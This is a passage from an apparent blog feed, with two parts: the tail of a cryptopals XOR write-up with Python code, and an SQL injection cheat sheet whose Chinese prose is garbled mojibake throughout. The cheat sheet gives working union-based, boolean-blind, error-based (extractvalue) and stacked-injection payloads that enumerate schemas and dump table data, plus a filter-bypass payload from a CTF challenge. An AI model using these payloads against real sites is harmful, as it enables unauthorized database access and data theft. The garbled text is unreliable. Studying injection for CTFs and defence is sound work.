class="line">a282b2f20430a652e2c652a3124333a653e2b2027630c692b20283165286326302e27282f</span><br></pre></td></tr></table></figure><p>Encrypt a bunch of stuff using your repeating-key XOR function. Encrypt your mail. Encrypt your password file. Your .sig file. Get a feel for it. I promise, we arenâ€™t wasting your time with this. </p><p>é¢˜ç›®å‡çº§äº†!!!</p><h2 id="è„šæœ¬-4"><a href="#è„šæœ¬-4" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h2><p>å†™å®Œè„šæœ¬æ‰å‘ç°ä»–æ˜¯è¦æˆ‘åŠ å¯†, è€Œä¸æ˜¯è§£å¯†, æ‰€ä»¥åªå¥½å†å†™ä¸€ä¸ªåŠ å¯†çš„äº†</p><h3 id="è§£å¯†"><a href="#è§£å¯†" class="headerlink" title="è§£å¯†"></a>è§£å¯†</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Fixed_XOR <span class="keyword">import</span> fixed_xor</span><br><span class="line"><span class="keyword">from</span> Single_byte_XOR_cipher <span class="keyword">import</span> hex2text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keypadding</span>(<span class="params">ciplen, key</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([key[i % <span class="built_in">len</span>(key)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ciplen)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">text2hex</span>(<span class="params">text</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:] <span class="keyword">for</span> i <span class="keyword">in</span> text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    cipher = <span class="string">&#x27;0b3637272a2b2e63622c2e69692a23693a2a3c6324202d623d63343c2a26226324272765272\na282b2f20430a652e2c652a3124333a653e2b2027630c692b20283165286326302e27282f&#x27;</span></span><br><span class="line">    key = <span class="string">&#x27;ICE&#x27;</span></span><br><span class="line">    cipher = <span class="string">&#x27;&#x27;</span>.join(cipher.split(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    padkey = text2hex(keypadding(<span class="built_in">len</span>(cipher), key))</span><br><span class="line">    res = hex2text(fixed_xor(cipher, padkey))</span><br><span class="line">    print(res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="åŠ å¯†"><a href="#åŠ å¯†" class="headerlink" title="åŠ å¯†"></a>åŠ å¯†</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Fixed_XOR <span class="keyword">import</span> fixed_xor</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keypadding</span>(<span class="params">ciplen, key</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([key[i % <span class="built_in">len</span>(key)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ciplen)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">text2hex</span>(<span class="params">text</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:] <span class="keyword">for</span> i <span class="keyword">in</span> text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    plain = <span class="string">&quot;Burning &#x27;em, if you ain&#x27;t quick and nimble I go crazy when I hear a cymbal&quot;</span></span><br><span class="line">    key = <span class="string">&#x27;ICE&#x27;</span></span><br><span class="line">    padkey = keypadding(<span class="built_in">len</span>(plain), key)</span><br><span class="line">    hexplain = text2hex(plain)</span><br><span class="line">    hexpadkey = text2hex(padkey)</span><br><span class="line">    print(fixed_xor(hexplain, hexpadkey))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a name='6'></a></p><h1 id="cryptopals-1-6-Break-repeating-key-XOR"><a href="#cryptopals-1-6-Break-repeating-key-XOR" class="headerlink" title="cryptopals 1.6 - Break repeating-key XOR"></a>cryptopals 1.6 - Break repeating-key XOR</h1><h2 id="é¢˜ç›®-4"><a href="#é¢˜ç›®-4" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p> Thereâ€™s a <a href="https://cryptopals.com/static/challenge-data/6.txt">file here</a>. Itâ€™s been base64â€™d after being encrypted with repeating-key XOR.</p><p>Decrypt it.</p><p>Hereâ€™s how:</p><ol><li>Let KEYSIZE be the guessed length of the key; try values from 2 to (say) 40.</li><li>Write a function to compute the edit distance/Hamming distance between two strings. <em>The Hamming distance is just the number of differing bits.</em> The distance between:<br><code>this is a test</code> and  <code>wokka wokka!!!</code> is 37. Make sure your code agrees before you proceed.</li><li>For each KEYSIZE, take the first KEYSIZE worth of bytes, and the second KEYSIZE worth of bytes, and find the edit distance between them. Normalize this result by dividing by KEYSIZE.</li><li>The KEYSIZE with the smallest normalized edit distance is probably the key. You could proceed perhaps with the smallest 2-3 KEYSIZE values. Or take 4 KEYSIZE blocks instead of 2 and average the distances.</li><li>Now that you probably know the KEYSIZE: break the ciphertext into blocks of KEYSIZE length.</li><li>Now transpose the blocks: make a block that is the first byte of every block, and a block that is the second byte of every block, and so on.</li><li>Solve each block as if it was single-character XOR. You already have code to do this.</li><li>For each block, the single-byte XOR key that produces the best looking histogram is the repeating-key XOR key byte for that block. Put them together and you have the key.</li></ol><p>This code is going to turn out to be surprisingly useful later on. Breaking repeating-key XOR (â€œVigenereâ€) statistically is obviously an academic exercise, a â€œCrypto 101â€ thing. But more people â€œknow howâ€ to break it than can actually break it, and a similar technique breaks something much more important.<br><a name='7'></a></p><h1 id="cryptopals-1-7-AES-in-ECB-mode"><a href="#cryptopals-1-7-AES-in-ECB-mode" class="headerlink" title="cryptopals 1.7 - AES in ECB mode"></a>cryptopals 1.7 - AES in ECB mode</h1><h2 id="é¢˜ç›®-5"><a href="#é¢˜ç›®-5" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p> The Base64-encoded content <a href="https://cryptopals.com/static/challenge-data/7.txt">in this file</a> has been encrypted via AES-128 in ECB mode under the key</p><pre><code>&quot;YELLOW SUBMARINE&quot;.</code></pre><p>(case-sensitive, without the quotes; exactly 16 characters; I like â€œYELLOW SUBMARINEâ€ because itâ€™s exactly 16 bytes long, and now you do too).</p><p>Decrypt it. You know the key, after all.</p><p>Easiest way: use OpenSSL::Cipher and give it AES-128-ECB as the cipher. </p><p>You can obviously decrypt this using the OpenSSL command-line tool, but weâ€™re having you get ECB working in code for a reason. Youâ€™ll need it a lot later on, and not just for attacking ECB. </p><blockquote><p>æœªå®Œå¾…ç»­â€¦<br><a name='8'></a></p></blockquote><h1 id="cryptopals-1-8-Detect-AES-in-ECB-mode"><a href="#cryptopals-1-8-Detect-AES-in-ECB-mode" class="headerlink" title="cryptopals 1.8 - Detect AES in ECB mode"></a>cryptopals 1.8 - Detect AES in ECB mode</h1><h2 id="é¢˜ç›®-6"><a href="#é¢˜ç›®-6" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p>In <a href="https://cryptopals.com/static/challenge-data/8.txt">this file</a> are a bunch of hex-encoded ciphertexts.</p><p>One of them has been encrypted with ECB.</p><p>Detect it.</p><p>Remember that the problem with ECB is that it is stateless and deterministic; the same 16 byte plaintext block will always produce the same 16 byte ciphertext.</p><blockquote><p>æœªå®Œå¾…ç»­â€¦</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;å¼€å§‹å­¦ä¹ cryptopalså•¦, ä¸€é¢˜ä¸€é¢˜çš„åšå®Œå®ƒå§(ä¹Ÿä¸çŸ¥é“èƒ½åšå¤šä¹…â€¦&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;ç›®å½•&quot;&gt;&lt;a href=&quot;#ç›®å½•&quot; class=&quot;headerlink&quot; title=&quot;ç›®å½•&quot;&gt;&lt;/a&gt;ç›®å½•&lt;/h1&gt;&lt;u</summary>
      
    
    
    
    <category term="CryptoSummary" scheme="http://tearsjin.github.io/categories/CryptoSummary/"/>
    
    
    <category term="Crypto" scheme="http://tearsjin.github.io/tags/Crypto/"/>
    
    <category term="cryptopals" scheme="http://tearsjin.github.io/tags/cryptopals/"/>
    
  </entry>
  
  <entry>
    <title>Experience summary of SQL injection</title>
    <link href="http://tearsjin.github.io/2020/09/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%8F%E9%AA%8C%E5%A4%A7%E6%9D%82%E7%83%A9/"/>
    <id>http://tearsjin.github.io/2020/09/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%8F%E9%AA%8C%E5%A4%A7%E6%9D%82%E7%83%A9/</id>
    <published>2020-09-29T09:16:53.000Z</published>
    <updated>2021-03-13T03:03:56.164Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ä¸€èˆ¬æ³¨å…¥"><a href="#ä¸€èˆ¬æ³¨å…¥" class="headerlink" title="ä¸€èˆ¬æ³¨å…¥"></a>ä¸€èˆ¬æ³¨å…¥</h2><p>é€šè¿‡ä¿®æ”¹å‚æ•°çš„å€¼, ä¾‹å¦‚<strong>æ­£å¸¸æ•°å­— å¤§æ•°å­— å­—ç¬¦ å•å¼•å· åŒå¼•å· æ‹¬å· åæ–œæ ç­‰ç­‰</strong>æ¥æ¢æµ‹æ˜¯å¦å­˜åœ¨æ³¨å…¥ç‚¹. å¦‚æœæœ‰æŠ¥é”™ä¿¡æ¯, åˆ™å¯ä»¥æ ¹æ®æŠ¥é”™ä¿¡æ¯è¿˜åŸSQLè¯­å¥.</p><blockquote><p>ä¾‹å¦‚åœ¨æ•°å­—åé¢åŠ  â€˜ ä¸è¡Œåˆ™å¯ä»¥è¯•è¯•åŠ  \</p></blockquote><h3 id="æ³¨å…¥æ“ä½œ-æ‰¾åˆ°æ³¨å…¥ç‚¹å¹¶è¿˜åŸSQLè¯­å¥å"><a href="#æ³¨å…¥æ“ä½œ-æ‰¾åˆ°æ³¨å…¥ç‚¹å¹¶è¿˜åŸSQLè¯­å¥å" class="headerlink" title="æ³¨å…¥æ“ä½œ(æ‰¾åˆ°æ³¨å…¥ç‚¹å¹¶è¿˜åŸSQLè¯­å¥å)"></a>æ³¨å…¥æ“ä½œ(æ‰¾åˆ°æ³¨å…¥ç‚¹å¹¶è¿˜åŸSQLè¯­å¥å)</h3><ol><li>åˆ©ç”¨<code>order by</code>æ¥åˆ¤æ–­å­—æ®µæ•°(è”åˆæŸ¥è¯¢éœ€è¦ç›¸åŒçš„å­—æ®µ)</li><li>å¾—åˆ°å­—æ®µæ•°å, åˆ¤æ–­æ˜¾ä½. ä¾‹å¦‚<code>url?id=-1&#39; union select 1,2,3</code>, è§‚å¯Ÿå“ªä¸ªæ•°å­—ä¼šæ˜¾ç¤ºå‡ºæ¥.</li><li>è·å–æ•°æ®åº“å(æ˜¾ä½æ˜¯2çš„æƒ…å†µä¸‹,ä¸‹é¢ä¹Ÿæ˜¯)</li></ol><ul><li><code>union select 1,database(),3</code></li><li><code>select 1 , group_concat(schema_name) , 3 from information_schema.schemata</code></li></ul><ol start="4"><li>åˆ—å‡ºæ•°æ®åº“ä¸­æ‰€æœ‰è¡¨(å‡è®¾åº“åæ˜¯test)</li></ol><ul><li><code>select group_concat(table_name) from information_schema.tables where table_schema = test</code> å¦‚æœä¸è¡Œ å¯ä»¥è¯•è¯•<code>&#39;test&#39;</code> <code>0x674657374</code>(æŠŠtestè½¬æˆåå…­è¿›åˆ¶) <code>database()</code></li></ul><ol start="5"><li>åˆ—å‡ºæ‰€æœ‰å­—æ®µ</li></ol><ul><li>select group_concat(column_name) from information_schema,columns where table_name = </li></ul><ol start="6"><li>çˆ†æ•°æ®å°±å®Œäº‹äº†</li></ol><h2 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h2><p>è·Ÿä¸€èˆ¬æ³¨å…¥çš„åŒºåˆ«åœ¨äº, æœåŠ¡ç«¯ä¸å†è¿”å›æŠ¥é”™å†…å®¹, æ³¨å…¥çš„æ—¶å€™åªèƒ½çŸ¥é“è‡ªå·±è¾“å…¥çš„è¯­å¥æ˜¯å¦å‡ºé”™, è€Œä¸”ä¹Ÿä¸èƒ½ç›´æ¥å¾—åˆ°åº“åè¡¨åè¿™äº›. ç›²æ³¨ä¸€èˆ¬åˆ†ä¸ºä¸¤ç§, ä¸€ç§æ˜¯åŸºäºå¸ƒå°”çš„, ä¸€ç§æ˜¯åŸºäºæ—¶é—´çš„.</p><h3 id="ç›¸å…³å‡½æ•°"><a href="#ç›¸å…³å‡½æ•°" class="headerlink" title="ç›¸å…³å‡½æ•°"></a>ç›¸å…³å‡½æ•°</h3><p>ä½¿ç”¨ç›²æ³¨å¾—çŸ¥é“ä¸€äº›å‡½æ•°: </p><ul><li>ascii(str): stræ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²å‚æ•°ï¼Œè¿”å›å€¼ä¸ºå…¶æœ€å·¦ä¾§å­—ç¬¦çš„asciiç ã€‚é€šè¿‡å®ƒï¼Œæˆ‘ä»¬æ‰èƒ½ç¡®å®šç‰¹å®šçš„å­—ç¬¦ã€‚</li><li>substr(str,start,len): è¿™ä¸ªå‡½æ•°æ˜¯å–strä¸­ä»ä¸‹æ ‡startå¼€å§‹çš„ï¼Œé•¿åº¦ä¸ºlençš„å­—ç¬¦ä¸²ã€‚é€šå¸¸åœ¨ç›²æ³¨ä¸­ç”¨äºå–å‡ºå•ä¸ªå­—ç¬¦ï¼Œäº¤ç»™asciiå‡½æ•°æ¥ç¡®å®šå…¶å…·ä½“çš„å€¼ã€‚</li><li>length(str): è¿™ä¸ªå‡½æ•°æ˜¯ç”¨æ¥è·å–strçš„é•¿åº¦çš„ã€‚è¿™æ ·æˆ‘ä»¬æ‰èƒ½çŸ¥é“éœ€è¦é€šè¿‡substrå–åˆ°å“ªä¸ªä¸‹æ ‡ã€‚</li><li>count([column]): ç»Ÿè®¡è®°å½•çš„æ•°é‡ï¼Œå…¶åœ¨ç›²æ³¨ä¸­ï¼Œä¸»è¦ç”¨äºåˆ¤æ–­ç¬¦åˆæ¡ä»¶çš„è®°å½•çš„æ•°é‡ï¼Œå¹¶é€ä¸ªç ´è§£ã€‚</li><li>if(condition,a,b): å½“conditionä¸ºtrueçš„æ—¶å€™ï¼Œè¿”å›aï¼Œå½“conditionä¸ºfalseçš„æ—¶å€™ï¼Œè¿”å›bã€‚</li><li>sleep(n): æœåŠ¡ç«¯ç­‰å¾…nç§’åè¿”å›è®°å½•, åœ¨æ—¶é—´ç›²æ³¨ä¸­, ç”¨äºåˆ¤æ–­è¯­å¥æ˜¯å¦æ­£ç¡®.</li><li>benchmark(times, func): æ‰§è¡Œtimesæ¬¡func, ä¹Ÿç”¨äºæ—¶é—´ç›²æ³¨, é€šè¿‡æœåŠ¡ç«¯çš„ååº”æ—¶é—´æ¥åˆ¤æ–­è¯­å¥æ˜¯å¦æ­£ç¡®.</li></ul><h3 id="åŸºäºå¸ƒå°”çš„ç›²æ³¨"><a href="#åŸºäºå¸ƒå°”çš„ç›²æ³¨" class="headerlink" title="åŸºäºå¸ƒå°”çš„ç›²æ³¨"></a>åŸºäºå¸ƒå°”çš„ç›²æ³¨</h3><p>åŸºäºå¸ƒå°”çš„ç›²æ³¨æ˜¯æ ¹æ®é¡µé¢å·®æ¥è¿›è¡Œåˆ¤æ–­æ³¨å…¥å’Œæ•°æ®æ³¨å…¥çš„ã€‚åœ¨å­˜åœ¨æ³¨å…¥çš„é¡µé¢è¾“å…¥and (true)åˆ™è¿”å›é¡µé¢1ï¼›è¾“å…¥and (false)åˆ™è¿”å›é¡µé¢2ï¼Œè€Œé¡µé¢1å’Œé¡µé¢2æœ‰å·®åˆ«ï¼Œå¸¸è§çš„æƒ…å†µé¡µé¢1æ˜¯æ­£å¸¸é¡µé¢ï¼Œé¡µé¢2æ˜¯é”™è¯¯é¡µé¢</p><h4 id="æ³¨å…¥æ“ä½œ"><a href="#æ³¨å…¥æ“ä½œ" class="headerlink" title="æ³¨å…¥æ“ä½œ"></a>æ³¨å…¥æ“ä½œ</h4><ol><li>è·å–ç”¨æˆ·å<ol><li>çŒœç”¨æˆ·åçš„é•¿åº¦<br><code>and(select length(user()))=æ•°å­—</code>, ä¸æ–­å°è¯•ä¸åŒçš„æ•°å­—å¾—åˆ°ç”¨æˆ·åçš„é•¿åº¦</li><li>é€ä½çŒœè§£ç”¨æˆ·å<br><code> and (select ascii(mid(user(),ä½æ•°,1)))=114</code>, çŒœæµ‹åœ¨æŸä¸ªä½ç½®çš„å­—æ¯çš„ASCIIç ä¸º114. é€šè¿‡è§‚å¯Ÿè¿”å›çš„é¡µé¢æ¥åˆ¤æ–­æ¯ä¸€ä½çš„å­—æ¯, æœ€ç»ˆå¾—åˆ°ç”¨æˆ·å</li></ol></li><li>è·å–å½“å‰æ•°æ®åº“çš„åº“å<ol><li>çŒœåº“åé•¿åº¦<br><code>and (select length(database()))=æ•°å­—</code></li><li>é€ä½çŒœè§£åº“å<br><code>and (select ascii(mid(database(),ä½æ•°,1)))=116</code></li></ol></li><li>è·å–è¡¨å<ol><li>åˆ¤æ–­è¡¨çš„æ•°é‡<br><code>and (select count(table_name) from information_schema.tables where table_schema=database())=4</code>,è¿™æ¡è¯­å¥å°±æ˜¯åˆ¤æ–­æ•°æ®åº“ä¸­æœ‰4å¼ è¡¨</li><li>åˆ¤æ–­è¡¨åçš„é•¿åº¦<br><code>and (select length(table_name) from information_schema.tables where table_schema=database() limit ä½æ•°,1)=5</code>, ä½æ•°æŒ‡çš„æ˜¯ç¬¬å‡ å¼ è¡¨</li><li>é€ä½æ‹†è§£è¡¨å<br><code>and (select ascii(mid(table_name,è¡¨åçš„ç¬¬å‡ ä½,1)) from information_schema.tables wheretable_schema=database() limit ç¬¬å‡ å¼ è¡¨,1)=100</code></li></ol></li><li>è·å–åˆ—å<ol><li>åˆ¤æ–­åˆ—çš„æ•°é‡<br><code>and (select count(column_name) form information_schema.columns where table_schema=è¡¨å)=æ•°å­—</code></li><li>åˆ¤æ–­åˆ—çš„é•¿åº¦<br><code>and (select length(column_name) form information_schema.columns where table_schema=è¡¨å limit ç¬¬å‡ åˆ—,1)=æ•°å­—</code></li><li>é€ä½çŒœè§£åˆ—å<br><code>and (select ascii(mid(column_name,ç¬¬å‡ ä¸ªå­—æ¯,1)) form information_schema.columns where table_schema=è¡¨å limit ç¬¬å‡ åˆ—,1)=æ•°å­—</code></li></ol></li><li>è·å–æ•°æ®<ol><li>åˆ¤æ–­æ•°æ®çš„æ¡æ•°<br><code>and (select conut(åˆ—å) from è¡¨å)=æ•°å­—</code></li><li>åˆ¤æ–­æ•°æ®çš„é•¿åº¦<br><code>and (select length(åˆ—å) from è¡¨å limit ç¬¬å‡ æ¡,1)=æ•°å­—</code></li><li>é€ä½çŒœè§£æ•°æ®<br><code>and (select ascii(mid(åˆ—å,ç¬¬å‡ ä¸ªå­—æ¯,1)) from è¡¨å limit ç¬¬å‡ æ¡,1)=æ•°å­—</code></li></ol></li></ol><p><strong>äº‹å®ä¸Š,ä»¥ä¸Šè¯­å¥ä¸­çš„â€™=â€™éƒ½å¯ä»¥ç”¨â€™&lt;â€™å’Œâ€™&gt;â€™æ¥ä»£æ›¿ä»¥ä¾¿äºæ›´å¿«çš„ç¡®å®šæ•°æ®</strong>, è€Œä¸”æ‰‹å·¥æ³¨å…¥å¾€å¾€éœ€è¦å¤§é‡çš„å°è¯•, è¿™éå¸¸çš„<del>æ“è›‹</del>ç¹ç, ä¸€èˆ¬å¯ä»¥å†™è„šæœ¬æ¥æ³¨å…¥</p><h3 id="åŸºäºæ—¶é—´çš„ç›²æ³¨"><a href="#åŸºäºæ—¶é—´çš„ç›²æ³¨" class="headerlink" title="åŸºäºæ—¶é—´çš„ç›²æ³¨"></a>åŸºäºæ—¶é—´çš„ç›²æ³¨</h3><p>åˆ©ç”¨<code>sleep()</code>æˆ–<code>benchmark()</code>ç­‰å‡½æ•°è®©mysqlæ‰§è¡Œæ—¶é—´å˜é•¿ç»å¸¸ä¸<code>if(expr1,expr2,expr3)</code>è¯­å¥ç»“åˆä½¿ç”¨, é€šè¿‡é¡µé¢çš„å“åº”æ—¶é—´æ¥åˆ¤æ–­æ¡ä»¶æ˜¯å¦æ­£ç¡®. <code>if(expr1,expr2,expr3)</code>å«ä¹‰æ˜¯å¦‚æœ<code>expr1</code>æ˜¯<code>True</code>, åˆ™è¿”å›<code>expr2</code>, å¦åˆ™è¿”å›<code>expr3</code>.</p><h4 id="æ³¨å…¥æ“ä½œ-1"><a href="#æ³¨å…¥æ“ä½œ-1" class="headerlink" title="æ³¨å…¥æ“ä½œ"></a>æ³¨å…¥æ“ä½œ</h4><p><del>åæ­£ä¹Ÿä¸ä¼šçœŸçš„å»æ‰‹å·¥æ³¨å…¥</del><strong>sqlmapå³å¯</strong></p><h2 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h2><p>æŠ¥é”™æ³¨å…¥æœ‰å¾ˆå¤šå¾ˆå¤š(è‡³å°‘æˆ‘åœ¨ç½‘ä¸ŠæŸ¥æ‰¾èµ„æ–™çš„æ—¶å€™çœ‹è§äº†å¾ˆå¤š), ä¸€è¾¹åšé¢˜, ä¸€è¾¹æŠŠé‡åˆ°çš„æŠ¥é”™æ³¨å…¥çš„æ–¹æ³•è¿›è¡Œæ€»ç»“å§.<br><strong>æŠ¥é”™æ³¨å…¥å°±æ˜¯åˆ©ç”¨äº†æ•°æ®åº“çš„æŸäº›æœºåˆ¶ï¼Œäººä¸ºåœ°åˆ¶é€ é”™è¯¯æ¡ä»¶ï¼Œä½¿å¾—æŸ¥è¯¢ç»“æœèƒ½å¤Ÿå‡ºç°åœ¨é”™è¯¯ä¿¡æ¯ä¸­</strong></p><h3 id="ç›®å½•"><a href="#ç›®å½•" class="headerlink" title="ç›®å½•"></a>ç›®å½•</h3><ul><li>é€šè¿‡<code>extractvalue()</code>æˆ–<code>updatexml()</code>å‡½æ•°</li></ul><h3 id="é€šè¿‡extractvalue-æˆ–updatexml-å‡½æ•°"><a href="#é€šè¿‡extractvalue-æˆ–updatexml-å‡½æ•°" class="headerlink" title="é€šè¿‡extractvalue()æˆ–updatexml()å‡½æ•°"></a>é€šè¿‡<code>extractvalue()</code>æˆ–<code>updatexml()</code>å‡½æ•°</h3><h4 id="åœºæ™¯"><a href="#åœºæ™¯" class="headerlink" title="åœºæ™¯"></a>åœºæ™¯</h4><ol><li>å½“unionè¢«è¿‡æ»¤çš„æ—¶å€™</li></ol><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><p><code>extractvalue()</code> :å¯¹XMLæ–‡æ¡£è¿›è¡ŒæŸ¥è¯¢çš„å‡½æ•°<br><code>udatexml()</code> :å¯¹XMLæ–‡æ¡£è¿›è¡Œæ›´æ–°çš„å‡½æ•°<br>è¯­æ³•ï¼š</p><ul><li><code>extractvalue(æ–‡æ¡£ï¼Œè·¯å¾„)</code></li><li><code>updatexml(ç›®æ ‡xmlæ–‡æ¡£ï¼Œxmlè·¯å¾„ï¼Œæ›´æ–°çš„å†…å®¹)</code></li><li><em>è·¯å¾„å†™å…¥å…¶ä»–æ ¼å¼ï¼Œå°±ä¼šæŠ¥é”™å¹¶ä¸”ä¼šè¿”å›æˆ‘ä»¬å†™å…¥çš„éæ³•æ ¼å¼å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªå¾—åˆ°æˆ‘ä»¬æƒ³å¾—åˆ°çš„å†…å®¹</em>*</li></ul><h4 id="å¸¸ç”¨payload"><a href="#å¸¸ç”¨payload" class="headerlink" title="å¸¸ç”¨payload"></a>å¸¸ç”¨payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">æŸ¥æ•°æ®åº“åï¼šid&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select database()))))</span><br><span class="line">çˆ†è¡¨åï¼šid&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))))</span><br><span class="line">çˆ†å­—æ®µåï¼šid&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;TABLE_NAME&quot;))))</span><br><span class="line">çˆ†æ•°æ®ï¼šid&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))</span><br></pre></td></tr></table></figure><h5 id="ä¾‹é¢˜-buuctf-æå®¢å¤§æŒ‘æˆ˜-hardsql"><a href="#ä¾‹é¢˜-buuctf-æå®¢å¤§æŒ‘æˆ˜-hardsql" class="headerlink" title="ä¾‹é¢˜: buuctf æå®¢å¤§æŒ‘æˆ˜ hardsql"></a>ä¾‹é¢˜: buuctf æå®¢å¤§æŒ‘æˆ˜ hardsql</h5><p>æƒ…æ™¯: <code>order by</code> <code>union</code> <code>ç©ºæ ¼</code> <code>and</code> è¢«è¿‡æ»¤<br>æŸ¥å­—æ®µåæ—¶å€™çš„payload:<code>?username=44&amp;password=1&#39;^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#39;H4rDsq1&#39;)))))%23</code>   </p><h2 id="è¯»å–æ–‡ä»¶"><a href="#è¯»å–æ–‡ä»¶" class="headerlink" title="è¯»å–æ–‡ä»¶"></a>è¯»å–æ–‡ä»¶</h2><h2 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a>å †å æ³¨å…¥</h2><p>åœ¨æ­£å¸¸çš„è¯­å¥åé¢åŠ åˆ†å·( ; ),å¯é¡ºåºæ‰§è¡Œå¤šæ¡è¯­å¥, ä»è€Œé€ æˆæ³¨å…¥æ¼æ´.<br>å †å æ³¨å…¥çš„å±€é™æ€§åœ¨äºå¹¶ä¸æ˜¯æ¯ä¸€ä¸ªç¯å¢ƒä¸‹éƒ½å¯ä»¥æ‰§è¡Œï¼Œå¯èƒ½å—åˆ°APIæˆ–è€…æ•°æ®åº“å¼•æ“ä¸æ”¯æŒçš„é™åˆ¶ï¼Œå½“ç„¶äº†æƒé™ä¸è¶³ä¹Ÿå¯ä»¥è§£é‡Šä¸ºä»€ä¹ˆæ”»å‡»è€…æ— æ³•ä¿®æ”¹æ•°æ®æˆ–è€…è°ƒç”¨ä¸€äº›ç¨‹åºã€‚</p><p>å †å æ³¨å…¥å¯ä»¥æ­é…ä¸€äº›è¯­å¥æ¥ç»•è¿‡å¯¹æŸäº›å…³é”®è¯çš„è¿‡æ»¤: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">;show databases     ------åˆ—å‡ºæ‰€æœ‰æ•°æ®åº“</span><br><span class="line">;show tables        ------åˆ—å‡ºæ‰€æœ‰è¡¨</span><br><span class="line">;show columns from table_name------åˆ—å‡ºæŸä¸ªè¡¨çš„æ‰€æœ‰å­—æ®µ</span><br><span class="line">;desc table_name</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="é€šè¿‡RENAMEæ›´æ”¹flagæ‰€åœ¨è¡¨åä¸ºé»˜è®¤æŸ¥è¯¢çš„è¡¨å"><a href="#é€šè¿‡RENAMEæ›´æ”¹flagæ‰€åœ¨è¡¨åä¸ºé»˜è®¤æŸ¥è¯¢çš„è¡¨å" class="headerlink" 